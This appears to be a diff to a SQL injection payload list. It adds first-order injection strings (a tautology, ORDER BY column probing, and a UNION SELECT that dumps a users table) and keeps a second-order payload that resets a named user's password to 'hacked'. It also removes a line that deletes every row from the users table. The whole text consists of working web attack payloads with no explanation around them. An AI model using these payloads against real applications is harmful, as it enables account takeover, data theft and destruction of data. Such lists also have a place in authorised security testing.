@@ -1,3 +1,7 @@
-'; UPDATE users SET password='hacked' WHERE username='tatum'-- -
+# first order
+' OR '1=1
+' ORDER BY 4;-- -
+' UNION SELECT * from users;-- -
+
+# second order sql injection
 '; UPDATE users SET password='hacked' WHERE username='tatum';-- -
-test'); DELETE from users;-- -
